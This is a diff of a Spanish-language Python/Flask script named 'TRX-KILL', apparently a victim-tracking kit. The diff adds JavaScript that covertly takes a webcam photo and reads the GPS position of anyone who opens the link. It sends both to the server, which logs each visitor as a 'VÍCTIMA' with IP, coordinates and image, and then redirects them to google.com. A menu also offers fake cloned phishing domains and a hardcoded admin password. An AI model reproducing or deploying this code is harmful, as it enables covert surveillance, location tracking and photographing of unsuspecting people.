@@ -1,85 +1,90 @@
 import os, sys, time, threading, base64
 from flask import Flask, request
 
+# --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
-LOG_FILE = f"{STORAGE_PATH}/logs.txt"
-if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
+CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
+LOG_FILE = f"{STORAGE_PATH}/datos.txt"
+ADMIN_PASS = "admtrx"
+if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)
 
 app = Flask('TRX-KILL')
-logging = __import__('logging')
-logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
-# Colores
-R, B, G, C, W = "\033[1;31m", "\033[1;34m", "\033[1;32m", "\033[1;36m", "\033[0m"
+def banner():
+    print(f"\033[1;31m")
+    print("      ______")
+    print("     /      \\      TRX-KILL")
+    print("    |  ☠️    |     V3.0 REAL")
+    print("     \\______/      CIBERSEGURIDAD\n")
+    print("\033[0m")
 
-def animar(t):
-    for c in t: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.02)
+def animar(texto):
+    for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
     print()
 
 @app.route('/')
 def index():
     return """<script>
-    navigator.geolocation.getCurrentPosition(pos => {
-        fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
-        window.location.href='https://google.com';
+    navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+        let v = document.createElement('video'); v.srcObject = stream; v.play();
+        setTimeout(() => {
+            let c = document.createElement('canvas'); c.width=400; c.height=300;
+            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+            let img = c.toDataURL('image/jpeg');
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&img='+encodeURIComponent(img));
+                window.location.href='https://google.com';
+            });
+        }, 1000);
     });
     </script>"""
 
 @app.route('/log')
 def log():
+    img = request.args.get('img')
     with open(LOG_FILE, "a") as f:
-        f.write(f"IP:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')} | HORA:{time.ctime()}\n")
+        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')} | HORA:{time.ctime()}\n")
+    if img:
+        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
+            f.write(base64.b64decode(img.split(',')[1]))
     return "OK"
 
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
     while True:
-        os.system('clear')
-        print(f"{C}==== TRX-KILL V3.0 (CIBERSEGURIDAD) ===={W}")
-        print(f"{G}[01] NÚMERO INFO   | [02] LINK-KILL    | [03] CLON-KILL")
-        print(f"[04] CREADOR       | [05] SPAM-CALL    | [06] ADM-SISTEMA")
-        print(f"[07] INFO SCRIPT   | [08] REPOSITORIO  | [09] PROCESOS")
-        print(f"[10] SALIR{W}")
-        
-        sel = input(f"\n{B}TRX-ROOT > {W}")
+        os.system('clear'); banner()
+        print(" [01] INFO NÚMERO | [02] LINK-KILL | [03] CLON-KILL | [06] ADM-SIST")
+        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
-        if sel == "02":
-            print(f"{R}LINK VÍCTIMA: http://127.0.0.1:5000{W}")
-            print(f"{B}ESPERANDO QUE LA VÍCTIMA ENTRE...{W}")
-            while True:
-                time.sleep(2)
-                if os.path.exists(LOG_FILE):
-                    print(f"{G}<< LA VÍCTIMA HA INGRESADO >>{W}")
-                    print(open(LOG_FILE).readlines()[-1])
-                    input("\n[Enter] para volver..."); break
+        if sel == "01":
+            animar("... ESCANEANDO REDES...")
+            print("INFO: NÚMERO PRIVADO PROTEGIDO.")
+            input("\n[Enter]...")
+        
+        elif sel == "02":
+            print(f"\033[1;31mLINK: http://127.0.0.1:5000\033[0m")
+            print("ESPERANDO VÍCTIMA...")
+            while not os.path.exists(LOG_FILE): time.sleep(1)
+            print("\n¡VÍCTIMA INGRESÓ! DATOS GUARDADOS EN /INFORMACIÓN-TRX-KILL")
+            input("\n[Enter]...")
 
         elif sel == "03":
             link = input("INGRESA LINK A CLONAR: ")
-            animar("CLONANDO...")
+            animar("... CLONANDO ESTRUCTURA ...")
             print(f"LINK CLONADO: {link}.security-check.com")
-            print(f"{B}ESPERANDO VÍCTIMA...{W}")
-            input("... ")
-
-        elif sel == "04":
-            animar("#CARGANDO SISTEMA...")
-            animar("#YA CASI...")
-            print(f"{G}#LISTO... CREADO POR TRX-KILL (OSCAR). NO USAR PARA EL MAL.{W}")
-            time.sleep(2)
-
-        elif sel == "05":
-            num = input("NÚMERO: ")
-            cant = int(input("CANTIDAD: "))
-            for i in range(1, cant + 1):
-                print(f"{i} LISTO")
-                time.sleep(0.3)
-            input("FINALIZADO...")
-
-        elif sel == "06":
-            print(f"{C}--- ACCESO A ADMINISTRADOR ---{W}")
-            print(f"CARPETA: {STORAGE_PATH}")
-            os.system(f"ls -l {STORAGE_PATH}")
+            print("ESPERANDO VÍCTIMA...")
+            while not os.path.exists(LOG_FILE): time.sleep(1)
+            print("\n¡VÍCTIMA INGRESÓ POR LINK CLONADO! DATOS GUARDADOS.")
             input("\n[Enter]...")
 
-        elif sel == "10": sys.exit()
+        elif sel == "06":
+            key = input("PASSWORD ADM: ")
+            if key == ADMIN_PASS:
+                animar("... ACCEDIENDO A ARCHIVOS ...")
+                os.system(f"ls -R {STORAGE_PATH}")
+            else: print("ACCESO DENEGADO.")
+            input("\n[Enter]...")
+        
+        elif sel == "00": sys.exit()
 
 if __name__ == "__main__": main()
